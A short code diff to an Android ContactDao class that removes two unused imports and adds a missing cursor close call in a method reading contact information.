@@ -7,10 +7,8 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
-import android.util.Log;
 
 import com.google.undercontrol.domain.ContactInfo;
-import com.google.undercontrol.utils.Utils;
 
 public class ContactDao {
 	private static final String TAG = "ContactDao";
@@ -55,7 +53,7 @@ public class ContactDao {
 				}
 
 			}
-
+			cur2.close();
 		}
 		cursor.close();
 		return list;
